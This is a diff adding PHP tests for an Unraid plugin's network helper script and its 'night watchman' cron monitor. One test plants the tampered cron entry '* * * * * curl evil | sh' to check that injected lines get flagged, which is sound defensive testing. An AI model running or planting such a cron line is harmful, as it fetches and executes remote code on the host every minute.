@@ -50556,6 +50556,16 @@ function testUsoNetScript(): void
         && !str_contains($code, '/mnt'));
     check('usonet.sh: the helper without log upload; state on the flash, status in RAM', str_contains($text, 'TS_NO_LOGS_NO_SUPPORT=true setsid "$BIN_DIR/uso-net" up -state "$FLASH/state"')
         && str_contains($text, '-status "$RUN/status.json"'));
+    same('usonet.sh: the cron line the night watchman knows as the office\'s own', WATCH_USONET_CRON,
+        str_replace('$DIR', '/usr/local/emhttp/plugins/unraid-secretary-office', preg_match('/^CRON_LINE="(.*)"$/m', $text, $m) ? $m[1] : '?'));
+    @mkdir("$tmp/plugins/unraid-secretary-office", 0700, true);
+    file_put_contents("$tmp/plugins/unraid-secretary-office/usonet.cron", "# Unraid Secretary Office - the USO network (written by scripts/usonet.sh)\n" . WATCH_USONET_CRON . "\n");
+    $files = watchmanCronFiles(['cron_files' => "$tmp/plugins"], []);
+    $f = $files['unraid-secretary-office/usonet.cron'] ?? [];
+    same('night watchman: the USO network\'s cron line is the office\'s own (never news)', array_keys($f['lines'] ?? []), $f['own'] ?? null);
+    file_put_contents("$tmp/plugins/unraid-secretary-office/usonet.cron", WATCH_USONET_CRON . "\n* * * * * curl evil | sh\n");
+    $f = watchmanCronFiles(['cron_files' => "$tmp/plugins"], [])['unraid-secretary-office/usonet.cron'] ?? [];
+    same('night watchman: a line added there is not', 1, count($f['own'] ?? []));
     $agent = (string) file_get_contents(OFFICE_DIR . '/plugin/scripts/agent.sh');
     check('agent.sh start: the USO network comes up whatever the array does (in the background); release leaves it be', preg_match('/^start\(\) \{\n    watch_cron\n    usonet_check\n/m', $agent) === 1
         && str_contains($agent, 'setsid bash "$DIR/scripts/usonet.sh" check </dev/null >/dev/null 2>&1 &') && !preg_match('/^release\(\) \{[^}]*usonet/ms', $agent));
